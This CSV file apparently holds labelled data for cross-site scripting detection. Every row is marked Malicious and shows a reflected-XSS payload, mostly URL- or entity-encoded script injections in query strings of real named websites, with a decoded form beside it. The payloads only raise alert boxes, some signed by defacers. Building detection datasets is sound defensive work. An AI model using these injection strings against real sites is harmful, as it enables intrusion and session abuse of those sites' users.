Payloads,Class,decoded,executed,parser_changed
http://computex.ws/index.asp?searchtext=%3cscript%3ealert%28%27e1+wuz+here%27%29%3c%2fscript%3e&amp;lt=s<br>earch,Malicious,http://computex.ws/index.asp?searchtext=<script>alert('e1 wuz here')</script><=search,True,True
http://www.whsh.tc.edu.tw/blog/special/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3<br>c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28<br>%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%<br>2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0<br>a&amp;page=1,Malicious,"http://www.whsh.tc.edu.tw/blog/special/index.php?action=index&setdate=200703&setday=21"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
&page=1",True,True
http://minashot.net/cgi-bin/report_yhet79849162rae56fd/9tq16f80gd7.cgi?mode=change&amp;no=9'%3e%22%3e'%3<br>e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious,"http://minashot.net/cgi-bin/report_yhet79849162rae56fd/9tq16f80gd7.cgi?mode=change&no=9'>"">'><script>alert(""xss by kusomiso.com"")</script>",True,True
http://w2.military-mayhem.com/registerver.php?ref=&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,http://w2.military-mayhem.com/registerver.php?ref=><script>alert(1);</script>,True,True
http://webdb.princeton.edu/dbtoolbox/query.asp?qname=&quot;&gt;&lt;script&gt;alert(&quot;x&quot;);&lt;/script&gt;,Malicious,"http://webdb.princeton.edu/dbtoolbox/query.asp?qname=""><script>alert(""x"");</script>",True,True
http://ssl1.peoplexs.com/peoplexs22/candidatesportalnologin/vacancy.cfm?cfid=48599&amp;cftoken=46f68819d<br>905f7af-6d908fb5-fe80-0364-7d00f5f7a56208d1&amp;jsessionid=dc303816a1e5acdafbca7f514841514a4de2tr&amp;portal<br>id=956&amp;vacatureid=57514&amp;bedrijfid=0&amp;vacancy=docent%20informaatie%20architectuur%3c/title%3e%3cscript<br>%3ealert(/jurpie/)%3c/script%3e,Malicious,http://ssl1.peoplexs.com/peoplexs22/candidatesportalnologin/vacancy.cfm?cfid=48599&cftoken=46f68819d905f7af-6d908fb5-fe80-0364-7d00f5f7a56208d1&jsessionid=dc303816a1e5acdafbca7f514841514a4de2tr&portalid=956&vacatureid=57514&bedrijfid=0&vacancy=docent informaatie architectuur</title><script>alert(/jurpie/)</script>,True,True
"<img id=xss src=javascript:alert(string.fromcharcode(88,83,83))>",Malicious,"<img id=xss src=javascript:alert(string.fromcharcode(88,83,83))>",True,True
http://www.bbcshop.com/bin/venda?ex=co_wizr-xapian&amp;threshold=1&amp;synall=1&amp;bsref=bbc&amp;searchfld=&amp;searchp<br>age=&amp;searchinvt=1&amp;searchstry=&amp;searchlike=1&amp;srchopt=v&amp;itemsperpage=10&amp;bklist1=&amp;searchex=%22%3e%3c%2ft<br>itle%3e%3c%2fscript%3e%3cscript%3ealert%281%29%3c%2fscript%3e+%22onmouseover%3d%22alert%281%29%22+on<br>mouseover%3dalert%281%29&amp;v=&amp;submit.x=19&amp;submit.y=5,Malicious,"http://www.bbcshop.com/bin/venda?ex=co_wizr-xapian&threshold=1&synall=1&bsref=bbc&searchfld=&searchpage=&searchinvt=1&searchstry=&searchlike=1&srchopt=v&itemsperpage=10&bklist1=&searchex=""></title></script><script>alert(1)</script> ""onmouseover=""alert(1)"" onmouseover=alert(1)&v=&submit.x=19&submit.y=5",True,True
http://www.wedesign.ro/redirect.php?url=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e<br>%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.wedesign.ro/redirect.php?url='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.aksaray68.net/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.aksaray68.net/search.asp?mtd=1&strkey=""><script>alert(""backdoor"")</script>",True,True
